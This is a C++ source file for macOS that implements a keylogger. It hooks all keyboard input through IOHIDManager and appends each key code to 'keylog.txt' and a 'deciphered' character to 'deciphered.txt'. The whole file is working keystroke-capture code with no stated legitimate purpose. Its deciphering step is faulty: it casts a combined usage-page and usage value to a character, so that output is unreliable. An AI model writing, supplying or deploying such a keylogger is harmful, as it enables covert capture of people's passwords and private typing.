#include <iostream>
#include <fstream>
#include <IOKit/hid/IOHIDManager.h>
#include <locale>
#include <codecvt>

void handleKeyPressCallback(void* context, IOReturn result, void* sender, IOHIDValueRef value) {
    IOHIDElementRef element = IOHIDValueGetElement(value);
    uint32_t usagePage = IOHIDElementGetUsagePage(element);
    uint32_t usage = IOHIDElementGetUsage(element);
    uint32_t keyCode = (usagePage << 16) | usage;

    // Open the log file in append mode
    std::ofstream logfile;
    logfile.open("keylog.txt", std::ios::app);

    // Write the key information to the log file
    logfile << "KeyCode: " << keyCode << std::endl;

    // Close the log file
    logfile.close();

    // Decipher and write the key to the deciphered file
    std::wofstream decipheredFile;
    decipheredFile.open("deciphered.txt", std::ios::app);

    wchar_t character = static_cast<wchar_t>(keyCode);
    decipheredFile.imbue(std::locale(decipheredFile.getloc(), new std::codecvt_utf8<wchar_t>));
    decipheredFile << "Deciphered: " << character << std::endl;

    // Close the deciphered file
    decipheredFile.close();
}

int main() {
    IOHIDManagerRef manager = IOHIDManagerCreate(kCFAllocatorDefault, kIOHIDOptionsTypeNone);
    CFMutableDictionaryRef matchingDict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

    // Set the usage page and usage values
    uint32_t pageValue = 0x01;  // Generic Desktop Page
    uint32_t usageValue = 0x06; // Keyboard Usage
    CFNumberRef page = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pageValue);
    CFNumberRef usage = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &usageValue);

    CFDictionarySetValue(matchingDict, CFSTR(kIOHIDDeviceUsagePageKey), page);
    CFDictionarySetValue(matchingDict, CFSTR(kIOHIDDeviceUsageKey), usage);
    CFRelease(page);
    CFRelease(usage);

    IOHIDManagerSetDeviceMatching(manager, matchingDict);
    CFRelease(matchingDict);

    IOHIDManagerRegisterInputValueCallback(manager, handleKeyPressCallback, NULL);
    IOHIDManagerScheduleWithRunLoop(manager, CFRunLoopGetCurrent(), kCFRunLoopDefaultMode);
    IOHIDManagerOpen(manager, kIOHIDOptionsTypeNone);

    CFRunLoopRun();

    IOHIDManagerClose(manager, kIOHIDOptionsTypeNone);
    IOHIDManagerUnscheduleFromRunLoop(manager, CFRunLoopGetCurrent(), kCFRunLoopDefaultMode);
    CFRelease(manager);

    return 0;
}
